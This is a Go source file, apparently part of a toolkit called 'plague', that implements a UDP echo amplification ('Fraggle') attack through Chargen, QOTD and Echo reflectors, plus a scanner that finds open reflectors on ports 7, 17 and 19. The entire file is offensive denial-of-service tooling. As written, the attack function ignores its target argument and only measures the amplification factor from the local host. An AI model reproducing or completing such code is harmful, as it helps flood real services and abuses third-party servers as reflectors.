package plague

import (
	"context"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Drone implements UDP echo amplification attack (FRAGGLE).
// Uses services like Chargen (port 19) and QOTD (port 17) that echo/amplify data.
type Drone struct {
	reflectors []string
}

// NewDrone creates a new Drone UDP amplification attack.
func NewDrone(reflectors []string) *Drone {
	return &Drone{reflectors: reflectors}
}

// Name returns the attack name.
func (d *Drone) Name() string {
	return "Drone"
}

// Description returns a brief description.
func (d *Drone) Description() string {
	return "Drone Chorus - UDP echo amplification (Chargen/QOTD)"
}

// Attack executes the UDP echo amplification attack.
func (d *Drone) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if len(d.reflectors) == 0 {
		return nil, fmt.Errorf("no reflectors provided - use 'plague scan' to find Chargen/QOTD servers")
	}

	if opts.Concurrency <= 0 {
		opts.Concurrency = 50
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful    atomic.Int64
		failed        atomic.Int64
		completed     atomic.Int64
		totalRespSize atomic.Int64
	)

	start := time.Now()

	// Small payload that triggers large response
	payload := []byte("X")
	payloadSize := len(payload)

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case idx, ok := <-jobs:
					if !ok {
						return
					}
					reflector := d.reflectors[idx%len(d.reflectors)]
					respSize, ok := d.sendUDPPacket(ctx, reflector, payload)
					if ok {
						successful.Add(1)
						totalRespSize.Add(int64(respSize))
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d packets", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	ampFactor := float64(0)
	if successful.Load() > 0 {
		avgRespSize := float64(totalRespSize.Load()) / float64(successful.Load())
		ampFactor = avgRespSize / float64(payloadSize)
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
		Amplification: ampFactor,
	}, nil
}

// sendUDPPacket sends a UDP packet and returns response size.
func (d *Drone) sendUDPPacket(ctx context.Context, addr string, payload []byte) (int, bool) {
	conn, err := net.DialTimeout("udp", addr, 2*time.Second)
	if err != nil {
		return 0, false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(2 * time.Second))

	_, err = conn.Write(payload)
	if err != nil {
		return 0, false
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return 0, false
	}

	return n, true
}

// ScanReflectors scans for UDP echo services (Chargen, QOTD).
func ScanReflectors(ctx context.Context, targets []string, verbose bool) []string {
	var found []string
	var mu sync.Mutex

	ports := []int{7, 17, 19} // Echo, QOTD, Chargen
	payload := []byte("test")

	var wg sync.WaitGroup
	sem := make(chan struct{}, 100)

	for _, target := range targets {
		for _, port := range ports {
			wg.Add(1)
			sem <- struct{}{}
			go func(t string, p int) {
				defer wg.Done()
				defer func() { <-sem }()

				addr := fmt.Sprintf("%s:%d", t, p)
				conn, err := net.DialTimeout("udp", addr, 1*time.Second)
				if err != nil {
					return
				}
				defer conn.Close()

				conn.SetDeadline(time.Now().Add(1 * time.Second))
				conn.Write(payload)

				buf := make([]byte, 1024)
				n, err := conn.Read(buf)
				if err == nil && n > 0 {
					mu.Lock()
					found = append(found, addr)
					if verbose {
						fmt.Printf("   Found reflector: %s (port %d)\n", t, p)
					}
					mu.Unlock()
				}
			}(target, port)
		}
	}

	wg.Wait()
	return found
}
